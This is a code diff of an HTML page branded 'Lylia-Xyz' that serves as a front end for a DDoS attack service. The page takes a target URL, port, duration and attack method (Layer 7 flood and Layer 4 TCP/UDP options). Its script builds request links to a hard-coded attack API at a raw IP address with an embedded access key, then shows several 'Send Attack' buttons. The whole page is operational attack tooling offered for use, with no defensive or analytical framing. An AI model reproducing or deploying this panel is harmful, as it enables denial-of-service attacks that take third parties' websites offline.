@@ -1,93 +1,133 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>DDoS By Lylia-Xyz</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="icon" type="image/x-icon" href="https://files.catbox.moe/7iegav.jpg">
+  <title>Lylia-Xyz</title>
   <style>
     body {
-      background-color: #ccc;
+      background-color: #000000;
       font-family: Arial, sans-serif;
-      padding: 20px;
+      color: #ffffff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
     }
     .container {
-      max-width: 500px;
-      margin: auto;
-      background: white;
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      background-color: #1a1a1a;
+      padding: 30px;
+      border-radius: 12px;
+      width: 400px;
     }
-    h1 {
+    h2 {
       text-align: center;
+      color: red;
     }
     label {
       display: block;
       margin-top: 15px;
     }
-    input {
+    input, select {
       width: 100%;
       padding: 10px;
       margin-top: 5px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
+      border-radius: 8px;
+      border: none;
+      background-color: #2e3448;
+      color: #fff;
+    }
+    option {
+      background-color: #1a1a1a;
+      color: white;
+    }
+    optgroup {
+      color: #ff4d4d;
     }
     button {
+      margin-top: 20px;
       width: 100%;
-      margin-top: 20px;
       padding: 10px;
-      background-color: red;
-      color: white;
       border: none;
-      border-radius: 5px;
+      border-radius: 8px;
+      background-color: red;
+      color: #fff;
+      font-size: 16px;
       cursor: pointer;
-      text-decoration: none;
-      display: inline-block;
     }
-    .result {
-      margin-top: 20px;
-      text-align: center;
+    #result {
+      margin-top: 15px;
+      display: none;
+    }
+    #result a button {
+      background-color: red;
+      margin-top: 10px;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>Lylia-Xyz Attack 😈</h1>
+    <img class="image" src="https://files.catbox.moe/5brd05.jpg" alt="Lylia-Xyz" loading="lazy">
+  	
+    <h2>Lylia-Xyz</h2>
+
     <label for="host">URL</label>
-    <input type="text" id="host" placeholder="https://example.com">
+    <input type="text" id="host" placeholder="https://example.com" />
 
     <label for="port">PORT</label>
-    <input type="text" id="port" placeholder="443">
+    <input type="number" id="port" placeholder="443" />
 
     <label for="time">TIME</label>
-    <input type="text" id="time" placeholder="60">
+    <input type="number" id="time" placeholder="60" />
 
     <label for="method">ATTACK METHOD</label>
-    <input type="text" id="method" placeholder="blast">
+    <select id="method">
+      <optgroup label="LAYER 7">
+        <option value="flood">FLOOD</option>
+        <option value="glory">GLORY</option>
+      </optgroup>
+      <optgroup label="LAYER 4">
+        <option value="tcp-gbps">TCP-GBPS</option>
+        <option value="udp-gbps">UDP-GBPS</option>
+      </optgroup>
+    </select>
 
-    <button onclick="generateLink()">Attack Now 😈</button>
+    <button onclick="generateAPI()">Confirm</button>
 
-    <div class="result" id="result"></div>
+    <div id="result"></div>
   </div>
 
   <script>
-    function generateLink() {
-      const host = document.getElementById('host').value;
-      const port = document.getElementById('port').value;
-      const time = document.getElementById('time').value;
-      const method = document.getElementById('method').value;
+    function generateAPI() {
+      const host = document.getElementById("host").value;
+      const port = document.getElementById("port").value;
+      const time = document.getElementById("time").value;
+      const method = document.getElementById("method").value;
 
-      if (!host || !port || !time || !method) {
-        alert('Harap isi semua data Untuk Melanjutkan.');
-        return;
+      if (host && port && time && method) {
+        const apis = [
+          "http://209.97.174.135:6004/api/Matzz",
+          "http://209.97.174.135:6004/api/Matzz",
+          "http://209.97.174.135:6004/api/Matzz",
+          "http://209.97.174.135:6004/api/Matzz",
+          "http://209.97.174.135:6004/api/Matzz"
+        ];
+
+        const params = `?key=Matzz&host=${host}&port=${port}&time=${time}&method=${method}`;
+        const resultDiv = document.getElementById("result");
+
+        let output = "";
+        apis.forEach((api, index) => {
+          const fullUrl = api + params;
+          output += `<a href="${fullUrl}" target="_blank"><button>Send Attack ${index + 1}</button></a>`;
+        });
+
+        resultDiv.innerHTML = output;
+        resultDiv.style.display = "block";
+      } else {
+        alert("Please fill in all fields.");
       }
-
-      const baseUrl = 'http://209.97.174.135:6004/api/Matzz';
-      const fullUrl = `${baseUrl}?key=Matzz&host=${encodeURIComponent(host)}&port=${port}&time=${time}&method=${encodeURIComponent(method)}`;
-
-      document.getElementById('result').innerHTML = `
-        <a href="${fullUrl}" target="_blank" class="button" style="background-color: red; color: white; padding: 10px 20px; border-radius: 5px; text-decoration: none; display: inline-block;">Send Attack</a>
-      `;
     }
   </script>
 </body>
